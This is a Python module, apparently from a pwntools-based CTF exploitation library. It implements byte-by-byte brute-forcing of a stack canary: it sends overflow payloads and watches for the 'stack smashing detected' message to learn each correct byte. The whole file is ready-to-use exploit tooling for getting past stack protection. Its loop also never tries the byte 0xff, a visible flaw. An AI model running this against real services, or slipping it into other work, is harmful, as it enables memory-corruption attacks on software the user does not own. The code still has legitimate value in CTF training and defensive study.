from pwn import p8
from ..misc import r, ru, rp, s, sl, uu64, log_canary
from ..log4ck import debug


class Canary:
    def __init__(self):
        self.value: bytes = b""
        self.padding = 0

        self.send_after_str = b''
        self.stack_overflow_str = b'*** stack smashing detected ***: terminated'

    def set_padding(self, padding: int):
        self.padding = padding

    def find_full_canary(self, padding: int = 0, send_after_str: bytes = b'', stack_overflow_str: bytes = b'***',
                         length: int = 8, initial_canary: bytes = b'\x00', recv_length: int = 0,
                         is_line: bool = False) -> bytes:

        self.padding = padding
        self.send_after_str = send_after_str
        self.stack_overflow_str = stack_overflow_str

        canary = initial_canary
        for index in range(1, length):  # We start from 1 since we have the initial 0 byte
            canary = self._find_canary_byte(canary, recv_length, is_line)
            debug(f"Current canary: {canary}")

        self.value = canary
        log_canary(uu64(canary))

        return self.value

    def _find_canary_byte(self, current_canary: bytes, recv_length: int, is_line: bool):

        for canary_byte_i in range(0xff):

            attempt_canary = current_canary + p8(canary_byte_i)

            pad = b'a' * self.padding + attempt_canary

            if is_line:
                ru(self.send_after_str)
                sl(pad)
            else:
                ru(self.send_after_str)
                s(pad)

            if rp(lambda x: self.stack_overflow_str in x) != b'':
                continue  # Incorrect byte, try the next one
            else:
                return attempt_canary  # Found correct byte

        raise ValueError("Could not find a valid byte")  # If no valid byte is found
